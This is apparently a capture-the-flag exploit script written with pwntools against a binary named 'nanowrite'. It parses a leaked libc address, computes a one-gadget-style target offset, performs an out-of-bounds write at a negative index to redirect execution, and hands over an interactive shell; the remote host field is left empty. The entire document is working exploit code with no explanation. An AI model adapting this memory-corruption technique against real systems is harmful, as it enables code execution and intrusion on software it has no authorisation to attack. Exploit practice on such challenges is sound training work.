from pwn import *

e = ELF("./nanowrite")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("", )
else:
  p = process(e.path)

def write(idx, val):
  p.sendline(str(idx) + " " + hex(val))

p.recvuntil("0x")
leak = int(p.recvuntil(" "), 16) + 0x00007f80d6196000 - 0x7f80d62a038c

print(hex(leak))

debug()

goal = leak + 0x4f322
sz = 0x100

write(-0x68 + 1, (goal // sz) % sz)

p.interactive()
